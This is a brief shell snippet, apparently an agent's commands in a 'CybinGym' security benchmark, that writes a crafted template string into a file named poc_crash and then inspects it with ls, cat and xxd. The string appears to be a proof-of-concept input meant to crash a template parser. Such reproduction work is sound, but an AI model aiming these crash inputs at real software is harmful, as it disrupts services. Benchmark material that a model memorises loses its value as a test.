printf '{{full_path?}}x{{/full_path}}' > /CybinGym_workdir/poc_crash
ls -l /CybinGym_workdir/poc_crash; echo "--- content ---"; cat /CybinGym_workdir/poc_crash; echo; echo "--- hexdump ---"; xxd /CybinGym_workdir/poc_crash
